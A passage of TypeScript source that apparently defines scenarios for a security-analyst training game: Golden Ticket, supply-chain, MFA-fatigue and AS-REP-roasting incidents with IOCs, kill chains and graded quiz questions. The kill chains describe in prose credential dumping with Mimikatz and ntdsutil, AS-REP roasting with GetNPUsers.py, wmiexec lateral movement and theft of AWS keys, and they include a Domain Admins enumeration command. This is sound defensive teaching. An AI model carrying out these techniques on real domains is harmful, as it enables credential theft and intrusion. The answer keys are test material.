      explanation: "The missing 4768 IS the finding. Normal Kerberos is a two-step exchange: the client asks the KDC for a TGT (4768), then presents that TGT to request service tickets (4769). A Golden Ticket is forged offline from the krbtgt hash, so the attacker already holds a TGT the KDC never issued and skips the AS exchange entirely - producing a 4769 with nothing before it. (The RDP logon to DC01 was NTLM, validated by a 4776, so it created no TGT either; the account's last 4768 was the previous morning.) That absence is what makes golden tickets hard: the ticket itself is cryptographically valid and looks entirely normal in isolation. The RC4 encryption (0x17) on a domain that has been AES-only since 2024 is the corroborating signal, because forging tools default to RC4 - it needs only the NTLM hash rather than the AES keys. Silver Ticket (T1558.002) forges a SERVICE ticket with the service account's hash and would show no 4769 either, since it skips the TGS exchange too - here we HAVE a 4769, so the KDC was involved and the forgery is upstream of it. Kerberoasting (T1558.003) is the reverse direction: it requests tickets in order to crack them, and requires a valid account to start from. Pass-the-Hash is NTLM, not Kerberos, and produces no ticket events at all.",
    },
    {
      id: "q_dc_03",
      prompt: "An analyst sees Event ID 1102 (Security audit log cleared) on a Domain Controller immediately after DCSync and NTDS.dit dump activity. What is the FIRST action the analyst should take?",
      kind: "single",
      options: [
        { value: "isolate",    label: "Isolate the Domain Controller and treat the entire domain as fully compromised" },
        { value: "email_user", label: "Send an email warning to the it.admin account holder to verify if they cleared the logs" },
        { value: "block_ip",   label: "Block the attacker's source IP at the perimeter firewall and continue monitoring" },
        { value: "wait",       label: "Wait for more evidence before escalating - log clearing may be routine maintenance" },
      ],
      answer: "isolate",
      xp: 50,
      explanation: "Event 1102 on a Domain Controller following confirmed credential theft (DCSync + NTDS dump) is a definitive indicator of a fully compromised domain. The attacker already holds the krbtgt hash and has forged Golden Tickets - blocking an IP or waiting for more evidence is useless because Golden Tickets allow authentication from any IP and survive password resets of normal accounts. The correct response is immediate containment of the DC (network isolation that keeps the machine powered on, so volatile evidence such as memory and the live session survives), emergency krbtgt password reset (twice, to invalidate all existing tickets), and escalation to a full domain recovery plan. Isolating a DC is a deliberate decision with replication and FSMO consequences, but here the alternative is leaving a fully compromised DC online. Emailing the user is inappropriate given the confirmed attack chain.",
    },
    {
      id: "q_dc_04",
      prompt: "After the attacker clears the Security event log on DC01, which TWO methods would a threat hunter use to reconstruct the attack timeline?",
      kind: "multi",
      options: [
        { value: "siem_forwarding", label: "Pull forwarded events from the SIEM - events streamed before log clear are preserved in the SIEM index" },
        { value: "edr_telemetry",   label: "Query Defender for Endpoint telemetry for ntdsutil.exe, wdhelper.exe and wevtutil.exe process execution - EDR logs are independent of the Windows Event Log" },
        { value: "fw_rules",        label: "Review firewall rule-change logs on the perimeter appliance - ACL modifications would show which internal hosts the attacker opened paths between" },
        { value: "backup_system",   label: "Restore the previous night's system-state backup of DC01 to a lab host and read the Security log from before the clear" },
      ],
      answer: ["siem_forwarding", "edr_telemetry"],
      xp: 100,
      explanation: "Event 1102 only clears the local Windows Security Event Log on the DC. It does NOT affect: (1) SIEM indexes - events already forwarded (via WEF/WEC or SIEM agent) are preserved in the SIEM independently of the local log. (2) EDR telemetry - Defender for Endpoint keeps its own process, file and registry event stream, completely separate from the Windows Event Log subsystem, and it holds wdhelper.exe, reg.exe, ntdsutil.exe and wevtutil.exe with their command lines. Reviewing firewall rule changes is a valid investigation step but won't reconstruct the DC-side timeline. Restoring from backup would be a recovery action, not an investigative one - and modern backups won't contain deleted event logs in a recoverable forensic form.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "APT-IRONBEAR (nation-state, Russia nexus)",
    attack_kind: "dcsync_golden_ticket",
    briefing: "An interactive RDP logon for it.admin was recorded on SRV-NEXACORP-DC01 from an external address at 22:15 UTC (01:15 local) - the first time this account has authenticated from that country. Windows Defender raised a tool detection on the same host three minutes later. Nothing was blocked.",
    narrative: `At 22:15 UTC (01:15 AM Israeli time), NexaCorp's IT admin account - compromised weeks earlier via a targeted spearphishing campaign - was used to RDP directly into the primary Domain Controller from an IP at a Netherlands VPS hosting provider (NTLM, validated by a 4776). The attacker moved methodically: first copying a renamed Mimikatz binary into the admin's profile and running it - Defender flagged it but was configured not to block - then disabling Windows Defender via registry tamper and executing a DCSync attack against krbtgt using the legitimate DS-Replication-Get-Changes-All extended right. Within minutes the krbtgt account's NTLM hash was extracted - the domain's master Kerberos signing key. Using this hash, the attacker forged a Golden Ticket offline with a 10-year lifetime, granting unlimited, password-reset-resistant access to every service in the domain. The attacker then used the forged ticket from DC01 to authenticate to the secondary DC, ran ntdsutil in IFM mode to copy the entire Active Directory database (2.7 GB - every domain account's credentials) and the SYSTEM hive, created a disguised shadow admin account svc-monitoring-prod, added it to Domain Admins, and finally cleared the Security event log to erase the evidence. When the RDP session closed, 2.9 GB had gone out through it. Your job: trace the DCSync kill chain, identify the Golden Ticket indicators, and determine the correct incident response actions for a fully compromised Active Directory domain.`,
    learning_objectives: [
      "Identify DCSync attacks using Windows Event ID 4662 with DS-Replication-Get-Changes-All GUIDs",
      "Recognize Golden Ticket indicators: RC4 encryption (0x17) on an AES-only domain, and a 4769 service-ticket request with no preceding 4768 TGT",
      "Understand why krbtgt hash extraction enables long-term, password-reset-resistant domain persistence",
      "Detect shadow admin account creation and log clearing as post-exploitation cover-tracks techniques",
      "Know the correct incident response for a compromised Active Directory: DC isolation + double krbtgt reset",
    ],
    alerts: eventsToAlerts(events, scenarioId),
    events,
    iocs,
    killchain,
    questions,
  };
}

// =========================================================================
// Scenario 12: Supply Chain Attack — Malicious Vendor Update
// =========================================================================

export function buildSupplyChainScenario(scenarioId = "supply-chain-2026"): ScenarioBundle {
  const { title, events, T, MIN, attacker, victim, malDllHash } = supplyChainScenarioEvents();

  const iocs: IOC[] = [
    { type: "ip",     value: attacker.ip,          reputation: "malicious",  tags: ["external-infrastructure", "netherlands", "c2"] },
    { type: "ip",     value: attacker.relayIp,      reputation: "malicious",  tags: ["attacker-relay", "singapore"] },
    { type: "domain", value: attacker.c2Domain,     reputation: "malicious",  tags: ["c2", "fake-telemetry", "newly-registered"] },
    { type: "sha256", value: malDllHash,             reputation: "malicious",  tags: ["trojanized-binary", "supply-chain", "netpulse"] },
    { type: "user",   value: "devops-ci",            reputation: "malicious",  tags: ["iam-user", "stolen-access-key"] },
    { type: "user",   value: victim.adminEmail,      reputation: "suspicious", tags: ["service-identity", "devops", "ssh-key-exposed"] },
    { type: "url",    value: `https://${attacker.c2Domain}/`, reputation: "malicious", tags: ["c2-beacon"] },
  ];

  const killchain = [
    { ts: T(0),         phase: "Initial Access",    action: "Trojanized NetPulse v4.2.2 downloaded from the vendor's real update host: a legitimate signed package with a malicious helper binary inside (T1195.002)" },
    { ts: T(2 * MIN),   phase: "Execution",         action: "Signed installer runs and drops netpulse-telemetry-svc into /lib/x86_64-linux-gnu/, a system library folder (T1036.005)" },
    { ts: T(5 * MIN),   phase: "Execution",         action: "netpulse-agent starts the dropped helper from the wrong path; its hash matches nothing in NetPulse's baseline (T1195.002)" },
    { ts: T(8 * MIN),   phase: "C2",                action: "HTTPS beacon about every 45s to api.telemetry-cdn.net, a newly registered domain the web filter passes through (T1071.001)" },
    { ts: T(10 * MIN),  phase: "Persistence",       action: "Cron job /etc/cron.d/netpulse-health restarts the helper every 15 min (T1053.003)" },
    { ts: T(13 * MIN),  phase: "Discovery",         action: "find scans /home /root /etc /var/jenkins_home for credentials, .env, .pem files (T1083)" },
    { ts: T(18 * MIN),  phase: "Credential Access", action: "/root/.aws/credentials, the Jenkins master.key and the devops SSH private key are read from disk (T1552.001)" },
    { ts: T(22 * MIN),  phase: "Cloud Access",      action: "CloudTrail: AssumeRole from the Singapore relay IP using the stolen devops-ci key, first-ever use (T1078.004)" },
    { ts: T(25 * MIN),  phase: "Discovery",         action: "Rapid cloud recon: ListBuckets, DescribeInstances, ListSecrets, DescribeVpcs in under a minute (T1580)" },
    { ts: T(28 * MIN),  phase: "Exfiltration",      action: "S3 GetObject on rocketstack-prod-backups: nine objects, 2.3 GB in about three minutes (T1530)" },
    { ts: T(32 * MIN),  phase: "Lateral Movement",  action: "SSH to db-primary and jenkins with the stolen private key, after the exfiltration finished (T1021.004)" },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "sc_q1", xp: 75,
      prompt: "Events evt_sc_01 (proxy download) and evt_sc_02 (installer) look legitimate. Which single artifact in evt_sc_03 shows that the update delivered something NetPulse does not ship?",
      kind: "single",
      options: [
        { value: "path",    label: "The helper runs from /lib/x86_64-linux-gnu/, while the earlier rows show NetPulse's own agent and collector running from /usr/lib/netpulse/ with the vendor's hashes; its hash matches neither" },
        { value: "size",    label: "The package is 47.3 MB, roughly triple the size of the previous NetPulse point release recorded in the proxy log" },
        { value: "time",    label: "The installer ran at 14:32, outside the change-management window agreed with NetPulse for pushing agent updates" },
        { value: "tls",     label: "The package was fetched from a host other than the vendor's update domain, so the download was already hostile" },
      ],
      answer: "path",
      explanation: "The proxy row shows the package came from updates.netpulse.io, the vendor's real update host, and the install script ran under the approved change, so neither the download nor the timing is abnormal (the proxy log holds no earlier release to compare the size with). What does not fit is the helper started at 14:35: the baseline rows (evt_sc_00a, evt_sc_00b) show NetPulse's own binaries running from /usr/lib/netpulse/, while netpulse-telemetry-svc sits in /lib/x86_64-linux-gnu/, is unsigned, and its hash appears in no baseline row. The auditd and Falcon file-write rows (evt_sc_02a to evt_sc_02c) show the install script putting it there at 14:32. That is the signature of a compromised build pipeline: the transport and the signature on the package were genuine, the contents were not.",
    },
    {
      id: "sc_q2", xp: 50,
      prompt: "The C2 sessions in evt_sc_04 go to api.telemetry-cdn.net over HTTPS (port 443). Which statement best explains why the firewall let them out?",
      kind: "single",
      options: [
        { value: "https",   label: "The outbound policy allows HTTPS from servers, and the web filter only logs the Newly Registered Domain category with action passthrough, so nothing blocked the sessions" },
        { value: "vendor",  label: "The domain sits on the NetPulse vendor allowlist that the firewall administrator created during the original product deployment" },
        { value: "ip",      label: "The destination IP falls inside a CIDR range the firewall policy marks as trusted infrastructure, so no rule evaluates it" },
        { value: "geo",     label: "The Netherlands is not on the geo-blocking list, and the firewall only drops sessions to sanctioned or high-risk countries" },
      ],
      answer: "https",
      explanation: "The FortiGate web-filter row (evt_sc_04d) rates api.telemetry-cdn.net as a Newly Registered Domain (category 91) and passes it (eventtype ftgd_allow, action passthrough) under the same outbound policy that allows the traffic rows: the category is monitored, not blocked. The six traffic rows then show a session about every 45 seconds with near-identical byte counts, which is a beacon, and nothing in the logs supports an allowlist, a trusted range or a geo rule. Note also that the update download crossed the Zscaler proxy while the beacon left the server directly through the firewall, so the proxy never saw it: servers should be forced through the proxy, newly registered domains blocked for them, and DNS filtering should rate domain age.",
    },
    {
      id: "sc_q3", xp: 75,
      prompt: "The CloudTrail AssumeRole (evt_sc_08) comes from Singapore IP 18.141.220.50, not from the C2 IP 185.193.127.88 (Netherlands). What does this tell an analyst?",
      kind: "single",
      options: [
        { value: "relay",   label: "The attacker split infrastructure: C2 via the Netherlands, cloud API calls via a Singapore relay, to separate attribution" },
        { value: "second",  label: "A second, independent threat actor is attacking the cloud environment at the same time from its own, entirely separate infrastructure" },
        { value: "fp",      label: "A false positive: a remote developer legitimately using the devops-ci CI/CD credentials while travelling in Singapore" },
        { value: "sink",    label: "The C2 domain was sinkholed mid-incident, forcing the attacker to move operations onto a new Singapore IP address" },
      ],
      answer: "relay",
      explanation: "Sophisticated actors separate infrastructure by function: endpoint C2 uses one set of IPs, cloud API calls use different relay servers. The pivot that connects them is the credential theft: the three secret_file_read records at 14:48 show the helper opening /root/.aws/credentials, and four minutes later the devops-ci IAM user, whose access key lives in that file, calls AssumeRole from Singapore. Trace credentials, not just IPs. The other readings fail on the logs: the beacon to the Netherlands continues to 14:41 and the C2 never moved, the AssumeRole follows the file read by four minutes, and a travelling developer does not call ListSecrets and nine GetObject requests against the backup bucket within ten minutes of a first-ever AssumeRole.",
    },
    {
      id: "sc_q4", xp: 100,
      prompt: "Which TWO actions must happen immediately (within minutes) after confirming this supply chain compromise?",
      kind: "multi",
      options: [
        { value: "revoke",   label: "Revoke the stolen AWS IAM credentials for user devops-ci: stops cloud exfiltration and lateral cloud movement" },
        { value: "isolate",  label: "Network-isolate prod-srv-01 via EDR: cuts the C2 beacon and blocks SSH lateral movement to db-primary and jenkins" },
        { value: "notify",   label: "Notify the NetPulse vendor about the compromised update package" },
        { value: "submit",   label: "Submit the malicious binary's hash to VirusTotal for community threat sharing" },
      ],
      answer: ["revoke", "isolate"],
      explanation: "IAM credential revocation immediately stops all S3 exfiltration and further cloud discovery. EDR network isolation severs the C2 channel and prevents further SSH lateral movement to the database and CI/CD systems. Vendor notification and VirusTotal submission are important but are not immediate containment actions: they can wait 30 minutes while the active threat is stopped. Afterwards the devops SSH key, the Jenkins master.key and the AWS keys read at 14:48 must all be rotated, because the helper had read all three.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "APT-SHADOWSUPPLY (nation-state supply chain operator)",
    attack_kind: "supply_chain",
    briefing: "CrowdStrike raised a detection on prod-srv-01 at 14:35. The host completed a scheduled NetPulse agent auto-update earlier that afternoon under an approved change record. The firewall shows repeated outbound HTTPS from this server since. Confirm whether the two are related.",
    narrative: `On a Wednesday afternoon, RocketStack's production server ran a routine auto-update for the NetPulse infrastructure monitoring agent. The download came from the real vendor CDN, the package carried an authentic NetPulse signature, and the update was in the change management calendar. What no one at RocketStack knew was that APT-SHADOWSUPPLY, a nation-state group specializing in software supply chain attacks, had compromised NetPulse Solutions' build pipeline three days earlier and embedded a malicious helper binary inside the v4.2.2 package. The installer dropped it into /lib/x86_64-linux-gnu/ as netpulse-telemetry-svc. Within 3 minutes of installation netpulse-agent started it from that unexpected path, it began beaconing to a newly registered domain masquerading as vendor telemetry, and it wrote a cron job for persistence. Over the following 20 minutes it hunted for credentials, read the AWS access keys in /root/.aws/credentials, the Jenkins master key and the devops SSH private key, and the stolen key set was used from a Singapore relay to enumerate RocketStack's cloud account. The final blow: 2.3 GB of production database backups and customer PII downloaded from S3 in nine GetObject calls, through the same Singapore relay that initially appeared unrelated to the C2. Once the exfiltration was done, the same helper used the stolen private key to open SSH sessions to db-primary and jenkins. Your job: identify the supply chain indicator that exposes the trojanized update, trace the attacker's infrastructure chain across the log sources, and define the two immediate containment actions.`,
    learning_objectives: [
      "Understand why supply chain attacks bypass traditional controls: the initial download is legitimate and signed by a trusted vendor certificate",
      "Identify supply chain compromise indicators: a binary installed in the wrong path, a hash that matches nothing in the vendor's baseline, an unexpected child process of the vendor's agent",
      "Recognize C2-over-HTTPS beaconing: a regular interval, a newly registered domain and a policy that only monitors that category",
      "Correlate on-premise credential theft with subsequent cloud API activity from a different IP (infrastructure separation)",
      "Define immediate containment priority: IAM credential revocation to stop cloud damage, EDR isolation to cut C2 and lateral movement",
    ],
    alerts: eventsToAlerts(events, scenarioId),
    events, iocs, killchain, questions,
  };
}

// ─── MFA Fatigue → Okta Account Takeover (⭐ Easy) ───────────────────────────

export function buildMfaFatigueScenario(scenarioId = "mfa-fatigue-ato"): ScenarioBundle {
  const { title, events, T, MIN } = mfaFatigueScenarioEvents();

  const iocs: IOC[] = [
    { type: "ip",     value: "91.108.4.33",                            reputation: "malicious", tags: ["external-infrastructure", "moscow", "telegram-datacenter"] },
    { type: "email",  value: "j.chen.backup@proton.me",                reputation: "malicious", tags: ["exfil-target", "inbox-forwarding"] },
    { type: "host",   value: "DESKTOP-MOSCOW-99",                      reputation: "malicious", tags: ["attacker-device", "ca-policy-exclusion"] },
    // The persistence artifact is an Okta API token, identified in the Okta System
    // Log by its NAME, not a file hash: Okta never emits a SHA256 for a token. The
    // value is the token name from mfa_08_api_token's target, which the analyst can
    // genuinely read and cite. (IOC types have no "token" member; "user" is the
    // closest identity-shaped type.)
    { type: "user",   value: "j.chen-api-token-2026",                    reputation: "malicious", tags: ["okta-api-token", "persistence"] },
  ];

  const killchain = [
    { ts: T(0),                  phase: "Credential Access", action: "Nine password attempts for j.chen from 91.108.4.33 (Moscow) with python-requests, variants of a leaked password, kept under Okta's ten-attempt lockout (T1110.001)" },
    { ts: T(1 * MIN + 17_000),   phase: "Initial Access",    action: "The tenth attempt passes the password check; the sign-on policy answers CHALLENGE and Okta asks for MFA (T1078.004)" },
    { ts: T(1 * MIN + 20_000),   phase: "Credential Access", action: "MFA push bombardment begins: 24 Okta Verify pushes in 11 minutes, j.chen denies 12 of them (T1621)" },
    { ts: T(12 * MIN + 17_000),  phase: "Initial Access",    action: "j.chen approves the 24th push at 01:32:17 UTC; Okta opens a session for the attacker (T1621)" },
    { ts: T(12 * MIN + 44_000),  phase: "Persistence",       action: "Device 'DESKTOP-MOSCOW-99' enrolled to Okta 27 seconds after the approval (T1098.005)" },
    { ts: T(13 * MIN + 10_000),  phase: "Initial Access",    action: "Okta SSO to Microsoft Office 365, then an Entra sign-in to Microsoft Graph from the same Russian address (T1078.004)" },
    { ts: T(14 * MIN),           phase: "Collection",        action: "3,847 mailbox items synced through Microsoft Graph in four MailItemsAccessed records (T1114.002)" },
    { ts: T(16 * MIN),           phase: "Exfiltration",      action: "Nine files downloaded from the Finance and HR SharePoint sites in four minutes (T1530)" },
    { ts: T(20 * MIN),           phase: "Persistence",       action: "Okta API token 'j.chen-api-token-2026' created with no expiry, using j.chen's Org Administrator role (T1098.001)" },
    { ts: T(22 * MIN),           phase: "Defense Impairment", action: "Conditional Access policy modified to exclude DESKTOP-MOSCOW-99, using j.chen's Conditional Access Administrator role (T1556.009)" },
    { ts: T(24 * MIN),           phase: "Persistence",       action: "Exchange inbox forwarding rule created: all email forwarded to j.chen.backup@proton.me (T1114.003)" },
    { ts: T(25 * MIN),           phase: "Detection",         action: "Microsoft Sentinel raises 'MFA fatigue followed by successful sign-in' for j.chen" },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q1", xp: 20,
      prompt: "What is the first clear indicator this is MFA fatigue and not a user accidentally rejecting legitimate pushes?",
      kind: "single",
      options: [
        { value: "a", label: "The nine failed password attempts at the start: that many failures in 45 seconds is what MFA fatigue looks like" },
        { value: "b", label: "The approval was recorded at 01:32 UTC (02:32 UK time), outside j.chen's normal working hours, which is enough on its own" },
        { value: "c", label: "24 push notifications in 11 minutes for a sign-in from a Moscow address with a python-requests client: 12 denied, 11 ignored, then one approved" },
        { value: "d", label: "A new device, DESKTOP-MOSCOW-99, was enrolled 27 seconds after the approval, which shows the push was approved on purpose" },
      ],
      answer: "c",
      explanation: "MFA fatigue is the push pattern, read together with where the sign-in came from. The Okta rows show the sign-on policy challenging a sign-in that arrived from a Moscow address through a scripted client (python-requests), then 24 system.push.send_factor_verify_push events in 11 minutes: j.chen denied 12 (OV_RESPONSE_DENY), ignored 11, and approved the last one at 01:32. A real user mis-tapping does not produce a steady push every 28 seconds for a sign-in she did not start. The nine failed passwords are credential guessing, a separate earlier step; the hour is context, not proof; and the device enrolment is what the attacker did after the approval, not an indicator of the fatigue itself.",
    },
    {
      id: "q2", xp: 20,
      prompt: "The attacker modified a Conditional Access policy (mfa_09_ca_policy). Why is this particularly dangerous?",
      kind: "single",
      options: [
        { value: "a", label: "It switches off the MFA requirement tenant-wide, so every user in the organization can now sign in with a password alone" },
        { value: "b", label: "Their unmanaged device becomes exempt from the compliance requirement, so it keeps access despite never being Intune-compliant" },
        { value: "c", label: "It strips the sign-in log data from Entra ID, so the SOC loses the audit trail it needs to investigate the account takeover" },
        { value: "d", label: "It elevates the compromised account to Global Administrator, giving the attacker full control of every Entra ID object in the tenant" },
      ],
      answer: "b",
      explanation: "Read what the policy actually grants. 'Require Compliant Device' is a DEVICE-COMPLIANCE control, not an MFA control: the two are separate grant controls and usually live in separate policies. Excluding DESKTOP-MOSCOW-99 from it does not switch MFA off, and no Conditional Access exclusion lets anyone in without a password. What it does is exempt an unmanaged attacker-controlled machine from the control that would otherwise keep it out of the interactive Office 365 apps, because that device is never going to become Intune-compliant (the earlier Graph sign-in shows conditionalAccessStatus notApplied, so the policy had not yet been in the attacker's way). The change succeeded because j.chen already held the Conditional Access Administrator role (mfa_00b, granted in March), and the same standing admin roles explain the Okta API token: no privilege was escalated, it was inherited from the account. The persistence is real and it is the right answer; it just works through the compliance gate rather than the MFA gate. An analyst who reports 'MFA was disabled' sends the response team after the wrong control.",
    },
    {
      id: "q3", xp: 15,
      prompt: "Which observation in the first Okta rows (mfa_01_signin_fail_01 to mfa_01_signin_fail_09) best indicates scripted, non-human activity?",
      kind: "single",
      options: [
        { value: "a", label: "The python-requests/2.31.0 user agent, with attempts a few seconds apart from one Moscow address: a script, not a browser or the Okta Verify app" },
        { value: "b", label: "The failure reason INVALID_CREDENTIALS, which only an automated tool can trigger" },
        { value: "c", label: "The account was not locked out after the failures, which proves the attempts were not made by a person" },
        { value: "d", label: "The first attempt came at 01:20 UTC, an hour at which no legitimate user ever signs in" },
      ],
      answer: "a",
      explanation: "A browser or the Okta Verify app identifies itself as one; python-requests/2.31.0 is a Python HTTP library, and a steady cadence of attempts a few seconds apart from a hosting-provider address in Moscow is not how a person mistypes a password. It is the best observation, though not proof by itself: scripts and service accounts also use libraries, so an analyst corroborates it with the source address and what follows (here the push bombardment). INVALID_CREDENTIALS is what any wrong password logs, and the absence of a lockout simply reflects that nine attempts stay under Okta's ten-attempt threshold. The hour is context: people do sign in at night.",
    },
    {
      id: "q4", xp: 25,
      prompt: "In what order should you contain this incident?",
      kind: "single",
      options: [
        { value: "a", label: "Reset password first → Revoke active sessions → Notify user by email → Remove inbox forwarding rule → Remove enrolled device → Revoke API token" },
        { value: "b", label: "Notify user by email → Reset password → Remove enrolled device → Remove inbox forwarding rule → Revoke active sessions → Revoke API token" },
        { value: "c", label: "Remove inbox forwarding rule → Revoke API token → Reset password → Remove enrolled device → Notify the CISO → Revoke active sessions" },
        { value: "d", label: "Revoke all active sessions → Remove inbox forwarding rule → Revoke API token → Revert the Conditional Access exclusion and remove DESKTOP-MOSCOW-99 → Reset password and re-register MFA → Notify user by phone" },
      ],
      answer: "d",
      explanation: "Order matters: (1) Revoke sessions first, which stops live access. (2) Remove the forwarding rule, which stops ongoing email theft to the Proton address. (3) Revoke the API token, a persistence mechanism that survives a password reset. (4) Revert the Conditional Access exclusion and remove DESKTOP-MOSCOW-99 from the account, so the attacker's device cannot get back in. (5) Reset the password and re-register MFA, last, because the attacker's sessions and tokens are gone. Contact the user by phone, not email, because the attacker can read her mailbox. Because j.chen holds the Org Administrator and Conditional Access Administrator roles, treat her admin actions in the window as untrusted and review everything else those roles could change.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "UNC3944",
    attack_kind: "Identity Attack / Account Takeover",
    briefing: "Microsoft Sentinel raised a high-severity alert on j.chen at 01:45 UTC. j.chen is an IT systems administrator and holds the Okta Org Administrator and Entra Conditional Access Administrator roles. Log times are UTC; NexaCorp's offices run on UK time (UTC+1). j.chen has not been reached.",
    narrative: "UNC3944 bought a leaked password for j.chen from a credential marketplace. It was stale, so they tried nine variants from a Moscow address with a Python script, staying under Okta's ten-attempt lockout, and the tenth matched. They then triggered Okta Verify pushes to Jennifer Chen's phone 24 times in 11 minutes until she approved the last one at 01:32 UTC (02:32 UK time), tired and wanting the buzzing to stop. Within 30 seconds the attacker enrolled a new device, DESKTOP-MOSCOW-99, then single-signed-on to Microsoft 365, synced 3,847 mailbox items through Microsoft Graph and downloaded nine Finance and HR files. Because j.chen already held the Okta Org Administrator and Entra Conditional Access Administrator roles, the attacker needed no escalation: they created an Okta API token and added their device to a Conditional Access exclusion, and finished by forwarding all her email to an outside address (the IT group's outbound spam policy allows automatic external forwarding). Nothing in the logs shows an exploit; every step was made with her own legitimate credentials and privileges.",
    learning_objectives: [
      "Recognize MFA push bombardment pattern (volume + timing anomaly)",
      "Understand that a push approval from a foreign address with a scripted client is a key indicator, and that password failures before it are a separate guessing step",
      "Identify post-compromise Graph API activity as attacker-controlled access",
      "See why a compromised administrator account needs no privilege escalation, and review what its roles could change",
      "Know the correct incident response order: sessions → forwarding rules → API tokens → Conditional Access and devices → password reset",
    ],
    alerts: eventsToAlerts(events, scenarioId),
    events, iocs, killchain, questions,
  };
}

// ─── AS-REP Roasting → Offline Hash Crack (⭐⭐ Intermediate) ────────────────

export function buildAsRepRoastingScenario(scenarioId = "asrep-roasting"): ScenarioBundle {
  const { title, events, T, MIN, HOUR } = asRepRoastingScenarioEvents();

  const iocs: IOC[] = [
    { type: "host",   value: "WS-DEV-09",                               reputation: "suspicious", tags: ["internal-host", "attacker-pivot", "ip:10.0.1.45"] },
    { type: "ip",     value: "10.0.1.45",                               reputation: "malicious", tags: ["ws-dev-09", "kerberos-source"] },
    { type: "user",   value: "svc-backup",                              reputation: "suspicious", tags: ["compromised-service-account", "backup-operators", "preauth-disabled"] },
    { type: "user",   value: "svc-monitoring",                          reputation: "suspicious", tags: ["asrep-roasted", "preauth-disabled"] },
    { type: "user",   value: "svc-reports",                             reputation: "suspicious", tags: ["asrep-roasted", "preauth-disabled"] },
  ];

  const killchain = [
    { ts: T(-25 * MIN),            phase: "Foothold",          action: "m.johnson's console session on WS-DEV-09: the account every later workstation row runs under (explorer.exe, then cmd.exe)" },
    { ts: T(-4 * MIN - 20_000),    phase: "Discovery",         action: "powershell.exe runs Get-ADUser with a userAccountControl filter and writes the matching account names to users.txt (T1087.002)" },
    { ts: T(1 * MIN + 50_000),     phase: "Credential Access", action: "Impacket GetNPUsers.py launched by python.exe on WS-DEV-09 against nexacorp.com with -no-pass and that users file (T1558.004)" },
    { ts: T(2 * MIN),              phase: "Credential Access", action: "Three AS-REP TGTs requested within one second for svc-backup, svc-monitoring and svc-reports without credentials (PreAuthType=0, RC4) (T1558.004)" },
    { ts: T(3 * MIN),              phase: "Offline Cracking",  action: "Silent gap: hashcat cracks the RC4-encrypted AS-REP hashes offline, so no domain logs are generated (T1110.002)" },
    { ts: T(3 * MIN + 10_000),     phase: "Detection",         action: "Defender for Identity raises 'Suspected AS-REP Roasting attack': source WS-DEV-09, three target accounts" },
    { ts: T(6 * HOUR - 10_000),    phase: "Lateral Movement",  action: "python.exe on WS-DEV-09 runs wmiexec.py with the cracked svc-backup password against SRV-FILE01 (T1021.002)" },
    { ts: T(6 * HOUR),             phase: "Lateral Movement",  action: "DC01 validates svc-backup over NTLM (4776) and SRV-FILE01 logs a network logon from WS-DEV-09: the crack succeeded (T1078.002)" },
    { ts: T(6 * HOUR + 1 * MIN),   phase: "Privilege Abuse",   action: "SeBackupPrivilege and SeRestorePrivilege assigned to the svc-backup session on SRV-FILE01 (T1078.002)" },
    { ts: T(6 * HOUR + 5 * MIN),   phase: "Discovery",         action: "net group \"Domain Admins\" /domain runs through a WMI-spawned cmd.exe; output is read back over ADMIN$ (T1087.002)" },
    { ts: T(6 * HOUR + 12 * MIN),  phase: "Lateral Movement",  action: "The same password logs svc-backup on to DC01 from WS-DEV-09; the 4672 shows SeBackupPrivilege and SeRestorePrivilege (T1078)" },
    { ts: T(6 * HOUR + 19 * MIN + 51_000), phase: "Credential Access", action: "ntdsutil.exe writes an IFM copy of ntds.dit to C:\\Temp\\ntds_dump on DC01: every domain account's hash is now exposed (T1003.003)" },
    { ts: T(6 * HOUR + 26 * MIN),  phase: "Collection",        action: "The snapshot is compressed to C:\\Temp\\ntds.zip and pulled to WS-DEV-09 over the C$ share (T1560.001, T1039)" },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q1", xp: 20,
      prompt: "Events asrep_02, asrep_03 and asrep_04 all show Kerberos Event 4768. What single field makes these events malicious?",
      kind: "single",
      options: [
        { value: "a", label: "TicketEncryptionType is 0x17 (RC4-HMAC) rather than 0x12 (AES256), and that downgrade is what makes the returned ticket crackable" },
        { value: "b", label: "PreAuthType=0 means the account does not require pre-authentication: the attacker got the TGT without providing any credentials" },
        { value: "c", label: "All three requests share the same IpAddress value, showing one host enumerated tickets for three different accounts in sequence" },
        { value: "d", label: "The ServiceName is krbtgt, and a TGT request naming the krbtgt service is the signature of a forged Golden Ticket being presented" },
      ],
      answer: "b",
      explanation: "PreAuthType=0 is the smoking gun. Normal Kerberos auth requires the client to prove identity with an encrypted timestamp. Accounts with pre-auth disabled hand out AS-REP responses to anyone who asks, with no credentials needed. The attacker takes the RC4-encrypted TGT and cracks it offline. The other fields are context: RC4 (0x17) is the encryption type the tool asks for because hashcat cracks it fastest, one source address for three accounts within a second is what the tool does with a users file, and a krbtgt ServiceName is in every TGT request, forged or not.",
    },
    {
      id: "q2", xp: 20,
      prompt: "The domain controller logs the AS-REP requests at 09:02 and nothing from WS-DEV-09 again until the NTLM validation at 15:00, almost six hours later. What does this gap indicate?",
      kind: "single",
      options: [
        { value: "a", label: "The attacker was waiting out the account lockout window before retrying authentication against the domain controller" },
        { value: "b", label: "The attacker was staging additional tooling on the host, downloading PsExec and credential dumpers before moving laterally" },
        { value: "c", label: "Offline hash cracking: the gap between capturing the AS-REP hash and cracking it with a wordlist (e.g., hashcat)" },
        { value: "d", label: "The activity paused because the attacker operates on a different time zone and resumed at the start of their working hours" },
      ],
      answer: "c",
      explanation: "AS-REP Roasting produces an offline-crackable hash. The gap is the cracking time: no authentication traffic reaches the domain controller while hashcat works on the captured hashes, and the first use of the result is a command line on WS-DEV-09 at 14:59:50 that carries svc-backup's password and an NTLM validation of that exact account on DC01 ten seconds later. A lockout wait would be preceded by failed logons (4625, 4740), which do not exist, and staging tools would leave process and download rows on WS-DEV-09 in the gap, which are absent too. Hashcat on a GPU can crack weak service account passwords in minutes to hours.",
    },
    {
      id: "q3", xp: 15,
      prompt: "Event asrep_08 shows svc-backup receiving SeBackupPrivilege on SRV-FILE01, and asrep_09i shows the same on DC01. Why is this dangerous even without Domain Admin rights?",
      kind: "single",
      options: [
